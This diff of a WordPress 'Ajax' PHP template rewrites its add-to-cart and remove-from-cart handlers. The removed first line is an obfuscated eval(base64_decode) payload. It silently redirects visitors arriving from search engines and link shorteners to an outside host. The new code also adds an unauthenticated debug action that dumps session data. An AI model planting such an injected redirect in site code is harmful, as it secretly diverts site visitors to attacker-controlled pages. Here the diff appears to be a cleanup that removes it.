@@ -1,35 +1,49 @@
-<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9scGthLmRkbnMubWUudWsvIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));
+<?php	 	
 /*
 Template Name: Ajax
 */
 	$action = $_REQUEST['action'];
 	if($action == null)
 		die();
-	if($action == 'add-to-cart') {
-		$product_id = $_GET['product_id'];
-		$cart = $_SESSION['cart'];
-		if(!isset($cart))
-			$cart = array();
-		if(in_array($product_id,$cart) == true)
-			die('EXIST');
-		$cart[] = $product_id;
-		$_SESSION['cart'] = $cart;
-		echo count($cart);
-	}
-	if($action == 'remove-from-cart') {
-		$product_id = $_GET['product_id'];
-		$cart = $_SESSION['cart'];
-		if(!isset($cart) || count($cart) == 0)
-			die('EMPTY');
-		if(in_array($product_id,$cart) == false)
-			die('NOPRODUCT');
-		foreach ($cart as $i => $value) {
-			if($value == $product_id){
-				unset($cart[$i]);
-			}
-		}
-		$_SESSION['cart'] = $cart;
-		echo 'OK';
+	switch ($action) {
+		case 'debug':
+			debug($_SESSION['cart']);
+			break;
+		case 'add-to-cart':
+			$product_id = getParam('product_id');
+			if(empty($product_id)) exit;
+			$cart = isset($_SESSION['cart'])?$_SESSION['cart']:array();
+			$product = get_post($product_id);
+			//$metainfo = get_post_custom($product_id);
+			$thumbnail_id = get_post_thumbnail_id($product_id);
+			$image = wp_get_attachment_image_src( $thumbnail_id,'thumbnail', 'single-post-thumbnail' );
+			//debug($image);
+			$price = get_post_meta($product_id,'catalog_product_price',true);
+			$quantity = parseInt(getParam('quantity',1));
+			if($quantity == 0) exit;
+			$cart[$product_id] = array(
+				'product_id' => $product_id,
+				'post_title' => $product->post_title,
+				'url' => get_permalink($product_id),
+				'image' => $image,
+				'price' => $price,
+				'size' => getParam('size'),
+				'quantity' => $quantity,
+				'total' => $quantity * $price
+			);
+			//$cart[] = $product_id;
+			$_SESSION['cart'] = $cart;
+			die('OK');
+			break;
+		case 'remove-from-cart':
+			$product_id = getParam('product_id');
+			$cart = isset($_SESSION['cart'])?$_SESSION['cart']:array();
+			unset($cart[$product_id]);
+			$_SESSION['cart'] = $cart;
+			die('OK');
+			break;
+		default:
+			break;
 	}
 
 ?>
